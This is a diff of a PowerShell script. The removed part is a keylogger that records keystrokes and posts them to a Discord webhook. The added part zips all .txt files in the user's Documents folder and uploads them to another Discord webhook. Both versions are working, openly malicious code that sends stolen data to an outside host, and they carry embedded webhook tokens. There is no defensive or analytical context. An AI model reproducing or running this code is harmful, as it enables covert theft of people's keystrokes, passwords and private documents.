@@ -1,44 +1,35 @@
-# Keylogger and Send Logs to Discord
-function Start-Keylogger {
-    Add-Type -TypeDefinition @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class Win32 {
-        [DllImport("user32.dll")]
-        public static extern short GetAsyncKeyState(int vKey);
-    }
-"@
-    $logPath = "$env:TEMP\keylog.txt"
-    while ($true) {
-        Start-Sleep -Milliseconds 100
-        foreach ($char in 1..255) {
-            if ([Win32]::GetAsyncKeyState($char) -eq -32767) {
-                $key = ""
-                if ($char -ge 65 -and $char -le 90) { $key = [char]$char }
-                else {
-                    switch ($char) {
-                        8 { $key = "[BACK]" }
-                        9 { $key = "[TAB]" }
-                        13 { $key = "[ENTER]" }
-                        32 { $key = " " }
-                        default { $key = "[UNK-$(char)$char]" }
-                    }
-                }
-                Add-Content -Path $logPath -Value $key
-            }
-        }
-    }
-}
+# Define the path to the documents folder
+$documentsPath = "$env:USERPROFILE\Documents"
+# Define the path to the zip file
+$zipFilePath = "$documentsPath\txt_files.zip"
+# Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
 
-function Send-LogsToDiscord {
-    $webhook = "https://discord.com/api/webhooks/1243540781654999122/Z4JLrEvIfzLrZI97FEj86brTEnGbY1W69as2qVD5bLKr5NLHyUjmN7WW1YZIDO1Fk8e0"
-    $logPath = "$env:TEMP\keylog.txt"
-    if (Test-Path $logPath) {
-        $content = Get-Content -Path $logPath -Raw
-        $json = @{"content" = $content} | ConvertTo-Json
-        Invoke-RestMethod -Uri $webhook -Method Post -Body $json -ContentType "application/json"
-        Clear-Content -Path $logPath
-    }
-}
+# Compress all .txt files into a zip file
+Compress-Archive -Path "$documentsPath\*.txt" -DestinationPath $zipFilePath -Force
 
-Start-Keylogger
+# Prepare the file for upload
+$fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
+$fileName = [System.IO.Path]::GetFileName($zipFilePath)
+$boundary = [System.Guid]::NewGuid().ToString()
+$body = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n"
+$body += [System.Text.Encoding]::UTF8.GetString($fileBytes)
+$body += "`r`n--$boundary--`r`n"
+
+# Create a web request to send the file to Discord
+$webRequest = [System.Net.HttpWebRequest]::Create($webhookUrl)
+$webRequest.Method = "POST"
+$webRequest.ContentType = "multipart/form-data; boundary=$boundary"
+$webRequest.ContentLength = [System.Text.Encoding]::UTF8.GetByteCount($body)
+$webRequestStream = $webRequest.GetRequestStream()
+$webRequestStream.Write([System.Text.Encoding]::UTF8.GetBytes($body), 0, [System.Text.Encoding]::UTF8.GetByteCount($body))
+$webRequestStream.Close()
+
+# Get the response from the server
+$webResponse = $webRequest.GetResponse()
+$webResponseStream = $webResponse.GetResponseStream()
+$reader = New-Object System.IO.StreamReader($webResponseStream)
+$responseContent = $reader.ReadToEnd()
+$reader.Close()
+$webResponseStream.Close()
+$webResponse.Close()
